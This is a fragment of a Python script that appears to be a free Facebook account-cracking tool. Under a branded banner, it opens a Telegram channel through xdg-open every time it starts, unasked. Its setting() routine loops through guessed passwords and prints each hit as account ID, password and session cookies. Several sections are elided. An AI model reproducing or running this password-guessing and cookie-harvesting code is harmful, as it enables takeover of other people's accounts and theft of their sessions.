...
def back():
    login()
def contact():
   # os.system('xdg-openhttps://t.me/cyberteam1435')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
os.system("xdg-open https://t.me/cyberteam1435")
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
█████  ██       █████  ███    ███ ██ ███    ██ 
...
╠══[Facebook                 • Alamin hossen]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mAlamin-King ]   ║\33[1;34m   
╠══[Whatsapp                 • 01891576750 ]  ║\33[1;35m 
╠══[TOOLS                    • FREE]         ║ \33[1;32m   
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/ALAMIN.King.Ok.Bro")
    if hc in ['1','01']:
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\033[0;92m[ALAMIN-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
